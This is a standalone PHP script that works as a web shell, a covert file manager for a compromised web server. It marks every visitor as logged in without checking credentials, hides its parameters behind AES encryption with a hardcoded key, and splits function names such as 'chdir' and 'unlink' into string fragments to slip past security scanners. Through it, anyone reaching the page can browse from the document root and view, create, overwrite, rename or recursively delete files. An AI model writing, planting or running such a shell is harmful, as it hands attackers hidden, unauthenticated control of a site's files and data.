<?php
session_start();
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    $_SESSION['logged_in'] = true;
}

displayPageContent();

function displayPageContent() {
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);

    function encrypt($plaintext, $key) {
        $iv_length = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($iv_length);
        $encrypted = openssl_encrypt($plaintext, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($encrypted . '::' . $iv);
    }

    function decrypt($ciphertext, $key) {
        list($encrypted_data, $iv) = explode('::', base64_decode($ciphertext), 2);
        return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
    }

    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2';

    foreach ($_GET as $c => $d) $_GET[$c] = decrypt($d, $key);

    $cd = 'ch' . 'dir';
    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    $cd($currentDirectory);

    $viewCommandResult = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $mkd = 'mk' . 'dir';
        $u = 'un' . 'link';
        $fgc = 'file' . '_get_contents';
        $rnm = 're' . 'name';
        $rm = 'rm' . 'dir';

        if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                $mkd($newFolder);
                echo '<hr>' . encrypt('Suc', $key) . '!';
            } else {
                echo '<hr>' . encrypt('Exi', $key) . '!';
            }
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $newFile = $currentDirectory . '/' . $_POST['file_name'];
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, '') !== false) {
                    echo '<hr>' . encrypt('Suc', $key) . '!';
                } else {
                    echo '<hr>' . encrypt('Fail', $key) . '!';
                }
            } else {
                echo '<hr>' . encrypt('Exi', $key) . '!';
            }
        } elseif (isset($_POST['edit_file'], $_POST['file_content'])) {
            $fileToEdit = $currentDirectory . '/' . $_POST['edit_file'];
            if (file_exists($fileToEdit)) {
                if (!empty($_POST['file_content'])) {
                    if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
                        echo '<hr>' . encrypt('Edit', $key) . '!';
                    } else {
                        echo '<hr>' . encrypt('Fail', $key) . '!';
                    }
                } else {
                    echo '<hr>' . encrypt('Blank', $key) . '!';
                }
            } else {
                echo '<hr>' . encrypt('NFound', $key) . '!';
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if ($u($fileToDelete)) {
                    echo '<hr>' . encrypt('Del', $key) . '!';
                } else {
                    echo '<hr>' . encrypt('Fail', $key) . '!';
                }
            } elseif (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>' . encrypt('Del', $key) . '!';
                } else {
                    echo '<hr>' . encrypt('Fail', $key) . '!';
                }
            } else {
                echo '<hr>' . encrypt('NFound', $key) . '!';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if ($rnm($oldName, $newName)) {
                    echo '<hr>' . encrypt('Ren', $key) . '!';
                } else {
                    echo '<hr>' . encrypt('Fail', $key) . '!';
                }
            } else {
                echo '<hr>' . encrypt('NFound', $key) . '!';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = $fgc($fileToView);
                $viewCommandResult = '<hr><p>' . encrypt('Result', $key) . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>' . encrypt('NFound', $key) . '</p>';
            }
        }
    }

    echo '<center><div class="fig-ansi"></div></center>';

    echo '<hr>curdir: ';
    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if ($index == 0) {
            echo '<a href="?dummy=.php&d=' . encrypt($dir, $key) . '">' . $dir . '</a>';
        } else {
            $currentPath .= DIRECTORY_SEPARATOR . $dir;
            echo ' / <a href="?dummy=.php&d=' . encrypt($currentPath, $key) . '">' . $dir . '</a>';
        }
    }
    echo '<br>';

    echo '<hr><form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="folder_name" placeholder="New Folder Name"><input type="submit" value="Create Folder"></form>';
    echo '<form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="file_name" placeholder="Create New File"><input type="submit" value="Create File"></form>';
    echo '<form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="edit_file" placeholder="Edit Existing File"><textarea name="file_content" placeholder="File Content"></textarea><input type="submit" value="Edit File"></form>';
    echo '<form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="view_file" placeholder="View File"><input type="submit" value="View File"></form>';
    echo $viewCommandResult;
    echo '<div></div>';
    echo '<table border=1>';
    echo '<br><tr><th>Item Name</th><th>Size</th><th>View</th><th>Delete</th><th>Rename</th></tr>';
    foreach (scandir($currentDirectory) as $v) {
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?dummy=.php&d=' . encrypt($currentDirectory . '/' . $v, $key) : '?dummy=.php&d='.encrypt($currentDirectory, $key).'&f='.encrypt($v, $key);
        echo '<tr><td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td><td>'.$s['size'].'</td><td><form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value="View"></form></td><td><form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td><td><form method="post" action="?dummy=.php&'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td></tr>';
    }
    echo '</table>';

    function deleteDirectory($dir) {
        if (!file_exists($dir)) return true;
        if (!is_dir($dir)) {
            $u = 'un' . 'link';
            return $u($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') continue;
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
        $rm = 'rm' . 'dir';
        return $rm($dir);
    }
}
?>
